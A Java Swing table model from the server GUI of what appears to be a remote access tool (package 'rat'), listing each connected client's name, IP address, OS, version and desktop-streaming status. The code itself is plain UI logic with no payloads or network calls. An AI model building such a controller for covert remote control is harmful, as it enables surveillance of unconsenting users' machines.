package de.sogomn.rat.server.gui;

import java.util.ArrayList;

import javax.swing.table.AbstractTableModel;

final class ServerClientTableModel extends AbstractTableModel {
	private static final long serialVersionUID = 919111102883611810L;
	
	private ArrayList<ServerClient> serverClients;
	
	private static final int COLUMN_COUNT = 5;
	private static final String[] HEADERS = {
		"Name",
		"IP address",
		"OS",
		"Version",
		"Streaming"
	};
	
	public ServerClientTableModel() {
		serverClients = new ArrayList<ServerClient>();
	}
	
	@Override
	public String getColumnName(final int column) {
		if (column <= HEADERS.length - 1 && column >= 0) {
			return HEADERS[column];
		}
		
		return super.getColumnName(column);
	}
	
	@Override
	public Class<?> getColumnClass(final int columnIndex) {
		switch (columnIndex) {
		case 0:
			return String.class;
		case 1:
			return String.class;
		case 2:
			return String.class;
		case 3:
			return String.class;
		case 4:
			return Boolean.class;
		default:
			return super.getColumnClass(columnIndex);
		}
	}
	
	@Override
	public boolean isCellEditable(final int rowIndex, final int columnIndex) {
		return false;
	}
	
	@Override
	public Object getValueAt(final int rowIndex, final int columnIndex) {
		final ServerClient serverClient = getServerClient(rowIndex);
		
		if (serverClient == null) {
			return null;
		}
		
		switch (columnIndex) {
		case 0:
			return serverClient.getName();
		case 1:
			return serverClient.client.getAddress();
		case 2:
			return serverClient.getOs();
		case 3:
			return serverClient.getVersion();
		case 4:
			return serverClient.isStreamingDesktop();
		default:
			return null;
		}
	}
	
	@Override
	public int getColumnCount() {
		return COLUMN_COUNT;
	}
	
	@Override
	public int getRowCount() {
		return serverClients.size();
	}
	
	public void addServerClient(final ServerClient client) {
		serverClients.add(client);
		fireTableDataChanged();
	}
	
	public void removeServerClient(final ServerClient client) {
		serverClients.remove(client);
		fireTableDataChanged();
	}
	
	public ServerClient getServerClient(final int rowIndex) {
		if (rowIndex <= serverClients.size() - 1 && rowIndex >= 0) {
			return serverClients.get(rowIndex);
		}
		
		return null;
	}
	
}
